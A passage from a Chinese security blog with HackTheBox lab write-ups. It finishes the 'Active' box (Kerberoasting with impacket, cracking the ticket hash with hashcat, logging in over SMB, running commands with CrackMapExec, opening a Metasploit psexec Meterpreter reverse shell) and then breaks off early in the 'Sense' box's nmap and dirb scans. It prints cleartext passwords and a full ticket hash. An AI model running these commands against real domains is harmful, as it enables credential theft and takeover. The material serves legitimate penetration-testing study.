<td><a href="https://attack.mitre.org/software/S0363" target="_blank" rel="noopener">Empire</a> uses <a href="https://attack.mitre.org/software/S0194" target="_blank" rel="noopener">PowerSploit</a>‘s <code>Invoke-Kerberoast</code> to request service tickets and return crackable ticket hashes.<a href="https://github.com/PowerShellEmpire/Empire" target="_blank" rel="noopener">[10]</a></td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/software/S0357" target="_blank" rel="noopener"> Impacket </a></td>
<td><a href="https://attack.mitre.org/software/S0357" target="_blank" rel="noopener">Impacket</a> modules like GetUserSPNs can be used to get Service Principal Names (SPNs) for user accounts. The output is formatted to be compatible with cracking tools like John the Ripper and Hashcat.<a href="https://www.secureauth.com/labs/open-source-tools/impacket" target="_blank" rel="noopener">[9]</a></td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/software/S0194" target="_blank" rel="noopener"> PowerSploit </a></td>
<td><a href="https://attack.mitre.org/software/S0194" target="_blank" rel="noopener">PowerSploit</a>‘s <code>Invoke-Kerberoast</code> module can request service tickets and return crackable ticket hashes.<a href="https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/" target="_blank" rel="noopener">[8]</a><a href="https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/" target="_blank" rel="noopener">[5]</a></td>
</tr>
</tbody></table>
</blockquote>
<blockquote>
</blockquote>
<p>这里采用 impacket 套件的<code>GetUserSPNs</code>脚本，运行</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS -request</span></span><br><span class="line"></span><br><span class="line">/usr/share/doc/python3-impacket/examples/GetUserSPNs.py:438: SyntaxWarning: "is" with a literal. Did you mean "=="?</span><br><span class="line">if userDomain is '':</span><br><span class="line">Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">ServicePrincipalName Name MemberOf PasswordLastSet LastLogon</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-19 03:06:40.351723 2018-07-31 01:17:40.656520</span><br><span class="line"></span><br><span class="line">$krb5tgs$23$<span class="emphasis">*Administrator$ACTIVE.HTB$active/CIFS~445*</span>$22e12dfea4b9454f2eb6bc1532ce33da\$71a6ca7735386847e09dba2becbc27c296c0cc3d5bf52d4a9ced6504fb07d4cfede8199a9eee2190c24f5033c2c34408dfbc6cbf857ae55681913eaae1c8cc05699beb165b6946483150410fff3cd7e817bf45ba99825b10b1e5a9965b1b2aff022b469de01e7d6a28ae728bf46a43da29e78133d0abdd3aa3da7059385d1a331047f730455d6153e391303436821a317d2c1fa610464f92e3a9374ba87520b44a00b8d01a0db658c91a46d611bd1b1ac14a2a99b6ad296e07a845c5eebda3e82e36075d4bea9ca98e9e6c1a375510ac53ff1d9334851370cbb25d3b2941231ef4ac08c76b5c6d733927a6664e5db73f8b6681a10e252ee99d07049fd2646969bb40b7cec54349ee024403a8112dc90b8d148d3cdbe19a8141a3b6724ba6107bc112aab92e9b7a6f4123566c425082e84e5937defec68499ddc827fb3298c9057cb919fff3436f28250d359a6d65e21094932a362e3ed163ed297566da663db3c629de4b15ee5a6041483b4d3c2d94546b46b0ff589fe86a83446a3290b157dc769716beff038a7cf1ec999c8d81b5bdcd92c2820c159c6c786efd0a592ddc4f70286b666e423f857aa39245a11cce82a4e586103af79c8f1c8922bcdb02e0ac367c21003c574b35b63094c2dd99f9cbec01bde35ec1629f30cb8a0d7fdb120065359fba1884b5b4010798f9b9f5f76a4f72fca8f8b9e1ce8e3b9d3ebc3913a655860f7da052f298369483b3e5a024fd264a44ee1af3b1b30f62f3443aa1d690c2f953d03937504d248cd93f01c0152873780de1063ed40f960e2fb285ba6c82a9e723bc513b69b07f48ef65e61bb98e066e78deded46e9c879384fc36f41997958a135611bc637f44a0a34fe31729da3d1a4dd3822d6a381844257befd36aaa677d80b8a617c7c1f6085d3a6fde8121ff458a12600088d73ccccd9cd343385163f0a1ad40d551062db8dedd4d0247b7ceca5d6871dbec589a91cd935840c307b51255687d240b83e2eafe9134f568e40639d3c386a4ebdb8ac716405d14163435d4297c5265a1a2904a4d3a2d241516aa5dc68b66f2bd88b20443aa5f40539b5403f1dc0cbdfb77e803a63dcd633f94be80bf7aa625322f30b4ae43489d965e844fb9fe074874b4d42607c452ad0cce4f7a7fd33079baebc973b0a5c6a23951753eec8eeb93dcc97f36fc1662f9fc51ef2be91a40ea8009d5cc76cfaaf756194a8c66e8e906db5fda9003b4cd673edd19012f2870c748b4e089</span><br><span class="line"></span><br><span class="line"><span class="section">## 参数说明</span></span><br><span class="line"></span><br><span class="line">-dc-ip 域控的 ip 地址，此处靶机就是域控</span><br><span class="line">active.htb/SVC_TGS 域名称+用户名</span><br><span class="line">-request 请求用户的 TGS，并且按照 JtR 或者/hashcat 能识别的格式打印出来（默认关闭）</span><br><span class="line">-outputfile 以 JtR/hashcat 的格式输出到文件中</span><br></pre></td></tr></table></figure>

<p>得到一串管理员的 hash，用 hashcat 解密</p>
<blockquote>
</blockquote>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force -o res.txt</span></span><br><span class="line"></span><br><span class="line"><span class="section"># cat res.txt</span></span><br><span class="line"></span><br><span class="line">...master1968(省略部分信息)</span><br></pre></td></tr></table></figure>

<p>登录 smb 即可获取 root.txt</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //<span class="number">10.10</span>.<span class="number">10.100</span>/Users <span class="literal">-U</span> active.htb\\SVC_TGS%GPPstillStandingStrong2k18</span><br></pre></td></tr></table></figure>

<p>或者用老外爱用的 cme（即 CrackMapExec）</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># crackmapexec smb 10.10.10.100 -u Administrator -p "Ticketmaster1968" --pass-pol</span></span><br><span class="line"></span><br><span class="line">//查看域内密码策略 --pass-pol  </span><br><span class="line">SMB 10.10.10.100 445 DC [*] Windows 6.1 Build 7601 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB 10.10.10.100 445 DC [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)</span><br><span class="line"></span><br><span class="line"><span class="section"># crackmapexec smb 10.10.10.100 -u Administrator -p "Ticketmaster1968" -x whoami</span></span><br><span class="line"></span><br><span class="line">//执行命令 -x</span><br><span class="line">SMB 10.10.10.100 445 DC [*] Windows 6.1 Build 7601 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB 10.10.10.100 445 DC [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)</span><br><span class="line">SMB 10.10.10.100 445 DC [+] Executed command</span><br><span class="line">SMB 10.10.10.100 445 DC active\administrator</span><br></pre></td></tr></table></figure>

<p>也可用 msf 里的 psexec 拿 shell，要求管理员权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">use windows/smb/psexec</span><br><span class="line"></span><br><span class="line">//输入帐号密码即可，例如</span><br><span class="line">//...</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">10.10</span>.<span class="number">16.122</span>:<span class="number">4444</span></span><br><span class="line">[*] <span class="number">10.10</span>.<span class="number">10.100</span>:<span class="number">445</span> - Connecting to the server...</span><br><span class="line">[*] <span class="number">10.10</span>.<span class="number">10.100</span>:<span class="number">445</span> - Authenticating to <span class="number">10.10</span>.<span class="number">10.100</span>:<span class="number">445</span> as user <span class="string">'Administrator'</span>...</span><br><span class="line">[*] <span class="number">10.10</span>.<span class="number">10.100</span>:<span class="number">445</span> - Selecting PowerShell target</span><br><span class="line">[*] <span class="number">10.10</span>.<span class="number">10.100</span>:<span class="number">445</span> - Executing the payload...</span><br><span class="line">[+] <span class="number">10.10</span>.<span class="number">10.100</span>:<span class="number">445</span> - Service start timed out, OK <span class="keyword">if</span> running a command or non<span class="literal">-service</span> executable...</span><br><span class="line">[*] Sending stage (<span class="number">176195</span> bytes) to <span class="number">10.10</span>.<span class="number">10.100</span></span><br><span class="line">[*] Meterpreter session <span class="number">1</span> opened (<span class="number">10.10</span>.<span class="number">16.122</span>:<span class="number">4444</span> -&gt; <span class="number">10.10</span>.<span class="number">10.100</span>:<span class="number">50831</span>) at <span class="number">2020</span><span class="literal">-06</span><span class="literal">-28</span> <span class="number">01</span>:<span class="number">59</span>:<span class="number">35</span> +<span class="number">0800</span></span><br></pre></td></tr></table></figure>

<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="在-smb-中批量下载文件的方法"><a href="#在-smb-中批量下载文件的方法" class="headerlink" title="在 smb 中批量下载文件的方法"></a>在 smb 中批量下载文件的方法</h2><p><a href="https://superuser.com/questions/856617/how-do-i-recursively-download-a-directory-using-smbclient" target="_blank" rel="noopener">原文链接</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  smbclient <span class="string">'\\server\share'</span></span><br><span class="line">    mask <span class="string">""</span></span><br><span class="line">    recurse ON</span><br><span class="line">    prompt OFF</span><br><span class="line">    cd <span class="string">'path\to\remote\dir'</span></span><br><span class="line">    lcd <span class="string">'~/path/to/download/to/'</span></span><br><span class="line">    mget *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">smbclient <span class="string">'\\server\share'</span> <span class="literal">-N</span> <span class="literal">-c</span> <span class="string">'prompt OFF;recurse ON;cd '</span>path\to\directory\<span class="string">';lcd '</span>~/path/to/download/to/<span class="string">';mget *'</span></span><br></pre></td></tr></table></figure>

<h2 id="递归列出-smb-目录"><a href="#递归列出-smb-目录" class="headerlink" title="递归列出 smb 目录"></a>递归列出 smb 目录</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># smbmap -H 10.10.10.100 -R -u ''</span></span><br><span class="line"></span><br><span class="line">[+] IP: 10.10.10.100:445 Name: 10.10.10.100  </span><br><span class="line"> Disk Permissions Comment</span><br><span class="line">---- ----------- -------</span><br><span class="line">ADMIN$                                            	NO ACCESS	Remote Admin</span><br><span class="line"><span class="code">	C$ NO ACCESS Default share</span></span><br><span class="line">IPC\$ NO ACCESS Remote IPC</span><br><span class="line">NETLOGON NO ACCESS Logon server share</span><br><span class="line">Replication READ ONLY</span><br><span class="line">.\Replication\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 active.htb</span><br><span class="line">.\Replication\active.htb\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 DfsrPrivate</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Policies</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 scripts</span><br><span class="line">.\Replication\active.htb\DfsrPrivate\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ConflictAndDeleted</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Deleted</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Installing</span><br><span class="line">.\Replication\active.htb\Policies\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 &#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 &#123;6AC1786C-016F-11D2-945F-00C04fB984F9&#125;</span><br><span class="line">.\Replication\active.htb\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">fr--r--r-- 23 Sat Jul 21 18:38:11 2018 GPT.INI</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Group Policy</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 MACHINE</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 USER</span><br><span class="line">.\Replication\active.htb\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\Group Policy\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">fr--r--r-- 119 Sat Jul 21 18:38:11 2018 GPE.INI</span><br><span class="line">.\Replication\active.htb\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Microsoft</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Preferences</span><br><span class="line">fr--r--r-- 2788 Sat Jul 21 18:38:11 2018 Registry.pol</span><br><span class="line">.\Replication\active.htb\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Microsoft\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Windows NT</span><br><span class="line">.\Replication\active.htb\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Groups</span><br><span class="line">.\Replication\active.htb\Policies\&#123;6AC1786C-016F-11D2-945F-00C04fB984F9&#125;\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">fr--r--r-- 22 Sat Jul 21 18:38:11 2018 GPT.INI</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 MACHINE</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 USER</span><br><span class="line">.\Replication\active.htb\Policies\&#123;6AC1786C-016F-11D2-945F-00C04fB984F9&#125;\MACHINE\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Microsoft</span><br><span class="line">.\Replication\active.htb\Policies\&#123;6AC1786C-016F-11D2-945F-00C04fB984F9&#125;\MACHINE\Microsoft\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Windows NT</span><br><span class="line">SYSVOL NO ACCESS Logon server share</span><br><span class="line">Users NO ACCESS</span><br></pre></td></tr></table></figure>

<h2 id="用-hashcat-破解密码"><a href="#用-hashcat-破解密码" class="headerlink" title="用 hashcat 破解密码"></a>用 hashcat 破解密码</h2><p>以这里的为例</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>13100</th>
<th>Kerberos 5 TGS-REP etype 23</th>
</tr>
</thead>
</table>
<blockquote>
<p>——<a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" rel="noopener">https://hashcat.net/wiki/doku.php?id=example_hashes</a></p>
</blockquote>
<ul>
<li><code>-a 0</code>代表使用字典破解模式；</li>
<li><code>-m 0</code>代表 Hash Type，此处查表知，对应编号为<code>13100</code>；</li>
<li><code>--force</code>代表运行时无视错误</li>
</ul>
<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><ul>
<li>walkthrough:<a href="https://0xdf.gitlab.io/2018/12/08/htb-active.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2018/12/08/htb-active.html</a></li>
<li><a href="https://xz.aliyun.com/t/7726#toc-2" target="_blank" rel="noopener">域控提权合集 - 先知社区</a></li>
<li>hashcat 的各种格式<a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" rel="noopener">https://hashcat.net/wiki/doku.php?id=example_hashes</a></li>
<li>CME 的使用方法介绍<a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html" target="_blank" rel="noopener">https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html</a></li>
<li>How-To-Attack-Kerberos-101: <a href="https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html" target="_blank" rel="noopener">https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html</a></li>
<li><a href="https://adsecurity.org/?p=2288" target="_blank" rel="noopener">Finding Passwords in SYSVOL &amp; Exploiting Group Policy Preferences – Active Directory Security</a></li>
<li><a href="https://www.lifewire.com/how-to-find-a-users-security-identifier-sid-in-windows-2625149" target="_blank" rel="noopener">https://www.lifewire.com/how-to-find-a-users-security-identifier-sid-in-windows-2625149</a></li>
<li><a href="https://3gstudent.github.io/3gstudent.github.io/域渗透-Kerberoasting/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/域渗透-Kerberoasting/</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/05/29/yuque/HackTheBox%EF%BC%9ASense%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Unc1e">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Unc1e的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/05/29/yuque/HackTheBox%EF%BC%9ASense%E7%AC%94%E8%AE%B0/" itemprop="url">HackTheBox：Sense笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-29T13:12:57+08:00">
                2020-05-29
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>弄明白你打的网站，是什么 cms，跑的什么中间件，靶机风评如何，很有必要！</p>
</blockquote>
<p>10.10.10.60<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590729425195-edd08efe-80aa-4fc8-8213-6be000a8f0fd.png#align=left&display=inline&height=230&margin=%5Bobject%20Object%5D&name=image.png&originHeight=460&originWidth=718&size=114205&status=done&style=none&width=359" alt="image.png">)<img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590729534655-00471b96-ee98-450a-96b8-2890c99047c3.png#align=left&display=inline&height=225&margin=%5Bobject%20Object%5D&name=image.png&originHeight=449&originWidth=401&size=43455&status=done&style=none&width=200.5" alt="image.png"></p>
<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nmap -p- -sC -sV 10.10.10.60</span></span><br><span class="line"></span><br><span class="line">nmap scan report for 10.10.10.60</span><br><span class="line">Host is up (0.0058s latency).</span><br><span class="line">Not shown: 65533 filtered ports</span><br><span class="line">PORT    STATE SERVICE    VERSION</span><br><span class="line">80/tcp  open  http       lighttpd 1.4.35</span><br><span class="line">|_http-server-header: lighttpd/1.4.35</span><br><span class="line">|_http-title: Did not follow redirect to https://10.10.10.60/</span><br><span class="line">|_https-redirect: ERROR: Script execution failed (<span class="keyword">use</span> -d <span class="keyword">to</span> debug)</span><br><span class="line"><span class="number">443</span>/tcp <span class="keyword">open</span>  ssl/https?</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does <span class="keyword">not</span> represent <span class="built_in">time</span></span><br></pre></td></tr></table></figure>

<h1 id="lighttpd-1-4-35"><a href="#lighttpd-1-4-35" class="headerlink" title="lighttpd 1.4.35"></a>lighttpd 1.4.35</h1><p>80 端口会跳转到 443，443 端口是这个 web<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590766011762-f1f15c9a-d60e-43de-b3d3-6919607efa83.png#align=left&display=inline&height=497&margin=%5Bobject%20Object%5D&name=image.png&originHeight=994&originWidth=1577&size=170558&status=done&style=none&width=788.5" alt="image.png"></p>
<h2 id="dirb-扫目录"><a href="#dirb-扫目录" class="headerlink" title="dirb 扫目录"></a>dirb 扫目录</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">[~]$ dirb https://10.10.10.60</span><br><span class="line"></span><br><span class="line"><span class="comment">-----------------</span></span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line"><span class="comment">-----------------</span></span><br><span class="line"></span><br><span class="line">START_TIME: Fri May 29 05:22:42 2020</span><br><span class="line">URL_BASE: https://10.10.10.60/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">-----------------</span></span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line"></span><br><span class="line"><span class="comment">---- Scanning URL: https://10.10.10.60/ ----</span></span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/classes/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/css/</span><br><span class="line">+ https://10.10.10.60/favicon.ico (CODE:200|SIZE:1406)</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/includes/</span><br><span class="line">+ https://10.10.10.60/index.html (CODE:200|SIZE:329)</span><br><span class="line">+ https://10.10.10.60/index.php (CODE:200|SIZE:6690)</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/installer/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/javascript/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/themes/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/tree/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/widgets/</span><br><span class="line">+ https://10.10.10.60/xmlrpc.php (CODE:200|SIZE:384)</span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/classes/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/css/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/includes/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/installer/ ----</span></span><br><span class="line">+ https://10.10.10.60/installer/index.php (CODE:302|SIZE:0)</span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/javascript/ ----</span></span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/javascript/index/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/javascript/jquery/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/javascript/wizard/</span><br><span class="line"></span><br><span 